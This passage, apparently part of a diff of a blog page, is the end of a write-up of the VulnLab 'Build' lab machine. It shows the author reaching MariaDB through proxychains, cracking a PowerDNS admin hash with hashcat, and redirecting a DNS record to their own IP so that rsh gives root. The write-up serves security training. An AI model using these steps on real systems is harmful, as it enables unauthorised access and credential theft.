+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains4 mysql -u root -h 172.18.0.1 --skip-ssl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-build-writeup/mariadb1.png"
+	width="397"
+	height="286"
+	srcset="/p/vulnlab-build-writeup/mariadb1_hu10330919821606891165.png 480w, /p/vulnlab-build-writeup/mariadb1_hu6474564339114620721.png 1024w"
+	loading="lazy"
+	
+		alt="mariadb"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
+	
+></p>
+<h3 id="powerdns">PowerDNS
+</h3><p>From the PowerDNS database, we can obtain the administrator password using hashcat</p>
+<p><img src="/p/vulnlab-build-writeup/mariadb2.png"
+	width="1417"
+	height="144"
+	srcset="/p/vulnlab-build-writeup/mariadb2_hu1691056650174286294.png 480w, /p/vulnlab-build-writeup/mariadb2_hu15818015990071679121.png 1024w"
+	loading="lazy"
+	
+		alt="mariadb"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="984"
+		data-flex-basis="2361px"
+	
+></p>
+<h3 id="hashcat">hashcat
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">hashcat -a <span class="m">0</span> -m <span class="m">3200</span> hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege escalation
+</h2><h3 id="powerdns-1">PowerDNS
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from history;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-build-writeup/mariadb3.png"
+	width="1854"
+	height="233"
+	srcset="/p/vulnlab-build-writeup/mariadb3_hu2491934033905259397.png 480w, /p/vulnlab-build-writeup/mariadb3_hu3062581471090262723.png 1024w"
+	loading="lazy"
+	
+		alt="mariadb"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="795"
+		data-flex-basis="1909px"
+	
+></p>
+<p>In the database, in the <code>history</code> table, I found several IP addresses, and under one of them is the PowerDNS admin panel</p>
+<p><code>172.18.0.6</code></p>
+<p><img src="/p/vulnlab-build-writeup/powerdns1.png"
+	width="1176"
+	height="680"
+	srcset="/p/vulnlab-build-writeup/powerdns1_hu3426553241149544877.png 480w, /p/vulnlab-build-writeup/powerdns1_hu18344840850868953095.png 1024w"
+	loading="lazy"
+	
+		alt="powerdns"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="415px"
+	
+></p>
+<p><img src="/p/vulnlab-build-writeup/powerdns2.png"
+	width="1837"
+	height="988"
+	srcset="/p/vulnlab-build-writeup/powerdns2_hu14961692652623365162.png 480w, /p/vulnlab-build-writeup/powerdns2_hu6431463978318045126.png 1024w"
+	loading="lazy"
+	
+		alt="powerdns"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="446px"
+	
+></p>
+<p><img src="/p/vulnlab-build-writeup/powerdns3.png"
+	width="1610"
+	height="609"
+	srcset="/p/vulnlab-build-writeup/powerdns3_hu9728946474894023327.png 480w, /p/vulnlab-build-writeup/powerdns3_hu2641178934321861339.png 1024w"
+	loading="lazy"
+	
+		alt="powerdns"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="634px"
+	
+></p>
+<h3 id="rsh">rsh
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rsh 10.10.104.46
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After setting my own IP address for the <code>intern</code> record in the DNS zone and using the <code>rsh</code> client, I gain access as <code>root</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/jenkins/">Jenkins</a>
+        
+            <a href="/tags/gitea/">Gitea</a>
+        
+            <a href="/tags/exegol/">Exegol</a>
+        
+            <a href="/tags/sliver/">Sliver</a>
+        
+            <a href="/tags/proxychains/">Proxychains</a>
+        
+            <a href="/tags/nmap/">Nmap</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/ctf/">Ctf</a>
+        
+            <a href="/tags/hashcat/">Hashcat</a>
+        
+            <a href="/tags/socks5/">Socks5</a>
+        
+            <a href="/tags/misconfigurations/">Misconfigurations</a>
+        
+            <a href="/tags/rsync/">Rsync</a>
+        
+            <a href="/tags/mariadb/">Mariadb</a>
+        
+            <a href="/tags/powerdns/">Powerdns</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.26c5054a986a3b4c017d1e578533fe8507ebd2942734bae37ce7906ad6e3bd9f.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
